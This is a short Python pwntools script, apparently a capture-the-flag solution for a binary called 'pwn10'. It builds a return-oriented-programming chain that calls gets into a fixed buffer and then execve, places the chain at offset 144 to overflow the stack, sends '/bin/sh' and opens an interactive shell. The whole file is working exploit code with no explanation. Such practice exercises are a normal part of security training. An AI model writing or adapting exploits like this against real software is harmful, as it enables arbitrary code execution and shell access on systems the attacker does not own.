from pwn import *

elf = context.binary = ELF('pwn10')
context.kernel = 'amd64'
io = process(elf.path)

gets = 0x0804f840
buf = 0x080edde0


if __name__ == '__main__':
    rop = ROP(elf)
    rop.call(gets, arguments=[buf])
    rop.execve(buf, buf + 0x20, buf + 0x20)
    print(rop.dump())
    payload = flat({
        144: rop.chain(),
    })
    assert payload.find(b'\n') == -1

    # print(payload)
    io.sendline(b'10')
    io.sendline(payload)
    io.sendline(b'/bin/sh')
    io.interactive()
